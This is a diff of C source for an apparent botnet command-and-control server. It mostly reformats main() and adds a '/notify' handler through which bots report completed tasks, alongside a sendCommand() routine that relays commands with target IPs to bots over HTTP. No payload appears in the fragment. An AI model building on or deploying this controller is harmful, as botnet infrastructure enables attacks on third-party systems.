@@ -23,12 +23,8 @@
 
 // BOT -> Critical section
 
-
 active_bots *botnet;
 struct MHD_Daemon *mhd_daemon;
-
-
-
 
 // ! ########################################################### MAIN ######################################################################################
 int main(int argc, char const *argv[])
@@ -38,7 +34,6 @@ int main(int argc, char const *argv[])
 
     initializeSemaphores();
 
-    
     botnet = (active_bots *)malloc(sizeof(active_bots));
     if (botnet == NULL)
     {
@@ -46,27 +41,26 @@ int main(int argc, char const *argv[])
     }
     botnet->next = NULL;
     botnet->bot_id = 0;
-    
 
-     pthread_t* threads = (pthread_t*)malloc(2 * sizeof(pthread_t));
-        
-        //parent
-		if (pthread_create(&threads[0], NULL, parent,NULL) != 0) {
-			fprintf(stderr, "Can't create a new thread, error %d\n", errno);
-			exit(EXIT_FAILURE);
-		}
-        //child
-		if (pthread_create(&threads[1], NULL, child, NULL) != 0) {
-			fprintf(stderr, "Can't create a new thread, error %d\n", errno);
-			exit(EXIT_FAILURE);
-		}
+    pthread_t *threads = (pthread_t *)malloc(2 * sizeof(pthread_t));
 
+    // parent
+    if (pthread_create(&threads[0], NULL, parent, NULL) != 0)
+    {
+        fprintf(stderr, "Can't create a new thread, error %d\n", errno);
+        exit(EXIT_FAILURE);
+    }
+    // child
+    if (pthread_create(&threads[1], NULL, child, NULL) != 0)
+    {
+        fprintf(stderr, "Can't create a new thread, error %d\n", errno);
+        exit(EXIT_FAILURE);
+    }
 
-        for (int i = 0; i < 2; i++){
-		pthread_join(threads[i], NULL);
-
-        }
-
+    for (int i = 0; i < 2; i++)
+    {
+        pthread_join(threads[i], NULL);
+    }
 
     return 0;
 }
@@ -180,7 +174,6 @@ void sendCommand(char *command, int bot_id)
         char bot_ip[INET_ADDRSTRLEN] = {0};
         char target_ip[INET_ADDRSTRLEN] = {0};
         long bot_port;
-        
 
         if (botExists(bot_id) < 0)
         {
@@ -225,8 +218,6 @@ void sendCommand(char *command, int bot_id)
             strcat(new_url, request);
             curl_easy_setopt(curl, CURLOPT_URL, new_url);
 
-
-
             printf("Sending request:  %s to bot...\n", new_url);
             free(new_url);
         }
@@ -253,8 +244,6 @@ void sendCommand(char *command, int bot_id)
     }
 }
 
-
-
 int handle_request(void *cls, struct MHD_Connection *connection, const char *url,
                    const char *method, const char *version, const char *upload_data,
                    size_t *upload_data_size, void **con_cls)
@@ -273,7 +262,6 @@ int handle_request(void *cls, struct MHD_Connection *connection, const char *url
     struct in_addr address;
     inet_pton(AF_INET, bot_ip, &(address));
 
-
     // TODO get updates from bots
 
     if (findBot(address, port) == -1)
@@ -288,7 +276,31 @@ int handle_request(void *cls, struct MHD_Connection *connection, const char *url
         printf("Bot Connected \n");
     }
 
+    char *endpoint;
+    endpoint = strstr(url, "/notify");
+    if (endpoint != NULL)
+    {
+
+        printf("Botnet : \n");
+        list_botnet(1);
+
+        printf("Bot completed its task...\n");
+        int ID = getBotID(bot_ip, bot_port);
+        if (ID == -1)
+        {
+            printf("BOT %s:%s not present in botnet\n", bot_ip,bot_port);
+        }else{
+
+            updateBotInfo(ID,"","");
+        }
+
+
+        endpoint = NULL;
+    }
+
+    printf("Botnet updated: \n");
     list_botnet(1);
+
     MHD_destroy_response(response);
 
     return ret;
